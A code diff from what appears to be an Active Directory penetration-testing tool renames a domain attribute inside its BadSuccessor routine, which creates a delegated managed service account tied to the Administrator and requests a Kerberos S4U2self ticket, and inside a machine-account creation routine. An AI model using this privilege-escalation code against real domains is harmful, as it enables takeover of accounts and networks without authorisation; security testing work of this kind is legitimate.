@@ -111,7 +111,7 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     attr = {
         "objectClass": ["msDS-DelegatedManagedServiceAccount"],
         "sAMAccountName": dmsa+'$',
-        "dNSHostName": f"{dmsa}.{conn.ldap.dc_domain}",
+        "dNSHostName": f"{dmsa}.{conn.ldap.domainname}",
         "msDS-ManagedPasswordInterval": 30,
         "msDS-GroupMSAMembership": SECURITY_DESCRIPTOR.from_sddl(f"O:S-1-5-32-544D:(A;;0xf01ff;;;{self_sid})"),
         "msDS-DelegatedMSAState": 2,
@@ -128,7 +128,7 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     splitted_url = conn.ldap.co_url.split("-",1)
     if "sspi" in splitted_url[0]:
         LOG.error("[-] SSPI is not supported yet to retrieve dMSA TGT, use Rubeus or kerbad certstore, e.g.:")
-        LOG.error(f"badS4U2self 'kerberos+certstore://{conn.conf.domain}\\{conn.conf.username}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
+        LOG.error(f"badS4U2self 'kerberos+certstore://{conn.conf.domain}\\{conn.conf.username}' 'krbtgt/{conn.ldap.domainname}@{conn.ldap.domainname}' '{dmsa_sama}@{conn.ldap.domainname}' --dmsa")
         return
     
     url = "kerberos+" + splitted_url[1]
@@ -147,7 +147,7 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
             LOG.error("[-] DC2025 not found, try to reach one of the list above manually:")
             new_netloc = parsed.netloc.split("@")[0] + '@<DC2025_IP>' if '@' in parsed.netloc else parsed.netloc
             url = parse.urlunparse(parsed._replace(netloc=new_netloc, query=query_params))
-            LOG.error(f"[-] badS4U2self '{url}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
+            LOG.error(f"[-] badS4U2self '{url}' 'krbtgt/{conn.ldap.domainname}@{conn.ldap.domainname}' '{dmsa_sama}@{conn.ldap.domainname}' --dmsa")
             return
 
     new_netloc = parsed.netloc.split("@")[0] + '@' + host_params["ip"] if '@' in parsed.netloc else parsed.netloc
@@ -157,15 +157,15 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     try:
         cu = factory.KerberosClientFactory.from_url(url)
         client = cu.get_client_blocking()
-        service_spn = KerberosSPN.from_spn(f"krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}")
-        target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.ldap.dc_domain}")
+        service_spn = KerberosSPN.from_spn(f"krbtgt/{conn.ldap.domainname}@{conn.ldap.domainname}")
+        target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.ldap.domainname}")
         tgs, encTGSRepPart, key = client.with_clock_skew(client.S4U2self, target_user, service_spn, is_dmsa=True)
     except Exception as e:
         LOG.error(f"[-] Failed to retrieve dMSA TGT")
         if host_params["ip"] != conn.conf.dcip:
             LOG.error(f"[-] {host_params['ip']} may not be synchronized to {conn.conf.dcip}, wait or try to add dMSA directly on {host_params['ip']}")
         LOG.error("[-] Try using Rubeus, or something like:")
-        LOG.error(f"badS4U2self '{url}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
+        LOG.error(f"badS4U2self '{url}' 'krbtgt/{conn.ldap.domainname}@{conn.ldap.domainname}' '{dmsa_sama}@{conn.ldap.domainname}' --dmsa")
         raise e
 
     kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
@@ -220,9 +220,9 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime:
     # Default computer SPNs
     spns = [
         "HOST/%s" % hostname,
-        "HOST/%s.%s" % (hostname, conn.ldap.dc_domain),
+        "HOST/%s.%s" % (hostname, conn.ldap.domainname),
         "RestrictedKrbHost/%s" % hostname,
-        "RestrictedKrbHost/%s.%s" % (hostname, conn.ldap.dc_domain),
+        "RestrictedKrbHost/%s.%s" % (hostname, conn.ldap.domainname),
     ]
     attr = {
         "objectClass": [
@@ -232,7 +232,7 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime:
             "user",
             "computer",
         ],
-        "dnsHostName": "%s.%s" % (hostname, conn.ldap.dc_domain),
+        "dnsHostName": "%s.%s" % (hostname, conn.ldap.domainname),
         "userAccountControl": 0x1000,
         "servicePrincipalName": spns,
         "sAMAccountName": f"{hostname}$",
